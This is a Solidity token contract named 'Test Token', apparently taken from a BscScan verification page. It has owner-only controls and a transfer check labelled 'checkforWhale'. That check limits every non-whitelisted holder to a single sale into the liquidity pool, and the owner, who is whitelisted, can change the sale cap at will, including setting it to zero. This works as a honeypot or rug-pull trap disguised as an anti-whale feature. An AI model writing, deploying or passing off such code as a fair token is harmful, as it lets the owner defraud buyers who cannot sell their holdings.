/**
 *Submitted for verification at BscScan.com on 2022-01-21
*/

// SPDX-License-Identifier: Unlicensed;
pragma solidity ^0.8.7;
contract TestToken 
{
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 100_000_000_000 * 10 ** 9;
    uint256 private maxSaleLimit = 100_000_000 * 10 ** 9;
    string public name = "Test Token";
    string public symbol = "TT";
    uint public decimals = 9;
    address public owner;
    address public poolAddress = address(0); //will be set after adding liquidity.
    mapping(address => uint256) public sells;
    mapping(address => bool) private _whiteList;


    function includeToWhiteList(address _users, bool _enabled) external 
    {
        require(owner == msg.sender, 'Only owner');
        _whiteList[_users] = _enabled;
    }

    function setPoolAddress(address _address) public
    {
        require(owner == msg.sender, 'Only owner');
        poolAddress = _address;
    }

    function setMaxSaleLimit(uint256 _amount) public
    {
        require(owner == msg.sender, 'Only owner');
        maxSaleLimit = _amount;
    }

    function checkforWhale(address from, address to, uint256 amount) private
    {
        if(to==poolAddress && !_whiteList[from])
        {
            require(amount<=maxSaleLimit);
            require(sells[from]<1);
            sells[from] = sells[from]+1;
        }
    }

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() 
    {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
        _whiteList[msg.sender] = true;
    }

    function balanceOf(address _owner) public view returns(uint) {
        return balances[_owner];
    }

    function transfer(address to, uint value) external returns(bool) 
    {
        require(balanceOf(msg.sender) >= value, 'Balance is low');
        checkforWhale(msg.sender, to, value);
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) external returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        checkforWhale(from, to, value);
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns (bool) 
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }


}